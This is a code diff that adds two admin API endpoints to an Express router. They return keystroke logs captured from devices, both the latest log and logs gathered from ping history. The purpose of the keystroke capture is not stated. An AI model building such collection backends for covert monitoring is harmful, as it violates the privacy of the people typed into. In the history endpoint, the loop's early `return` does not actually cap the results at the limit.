@@ -338,5 +338,64 @@ const pingAllHandler = async (req: Request, res: Response): Promise<void> => {
 router.post('/ping-all', pingAllHandler);
 router.get('/ping-all', pingAllHandler);
 
+// ──────────────────────────────────────────────────────────────────
+// Keylog endpoints
+// ──────────────────────────────────────────────────────────────────
+
+// GET /api/admin/devices/:deviceId/keylog/latest — fast lookup from device doc
+router.get('/devices/:deviceId/keylog/latest', async (req: Request, res: Response): Promise<void> => {
+  try {
+    const deviceId = getParamString(req.params.deviceId);
+    if (!deviceId) { res.status(400).json({ error: 'deviceId is required' }); return; }
+
+    const doc = await db.collection('devices').doc(deviceId).get();
+    if (!doc.exists) { res.status(404).json({ error: 'Device not found' }); return; }
+
+    const data = doc.data();
+    res.status(200).json({
+      deviceId,
+      keylog: data?.latestKeylog || [],
+      recordedAt: data?.latestKeylogAt || null,
+      count: (data?.latestKeylog || []).length
+    });
+  } catch (error) {
+    console.error('Error fetching latest keylog:', error);
+    res.status(500).json({ error: 'Failed to fetch keylog' });
+  }
+});
+
+// GET /api/admin/devices/:deviceId/keylog?limit=20 — aggregated from history pings
+router.get('/devices/:deviceId/keylog', async (req: Request, res: Response): Promise<void> => {
+  try {
+    const deviceId = getParamString(req.params.deviceId);
+    if (!deviceId) { res.status(400).json({ error: 'deviceId is required' }); return; }
+
+    const limit = Math.min(Math.max(Number(req.query.limit) || 20, 1), 100);
+
+    const rawSnap = await db.collection('devices').doc(deviceId)
+      .collection('history').orderBy('createdAt', 'desc').limit(limit * 5).get();
+
+    const entries: any[] = [];
+    rawSnap.docs.forEach((d) => {
+      const data = d.data();
+      if (data.keystrokeLog && data.keystrokeLog.length > 0) {
+        entries.push({
+          pingId: d.id,
+          timestamp: data.timestamp,
+          keystrokeLog: data.keystrokeLog,
+          count: data.keystrokeCount || data.keystrokeLog.length
+        });
+        if (entries.length >= limit) return;
+      }
+    });
+
+    res.status(200).json({ deviceId, pings: entries, totalPingsWithKeylog: entries.length });
+  } catch (error) {
+    console.error('Error fetching keylog history:', error);
+    res.status(500).json({ error: 'Failed to fetch keylog history' });
+  }
+});
+
 export default router;
+
 
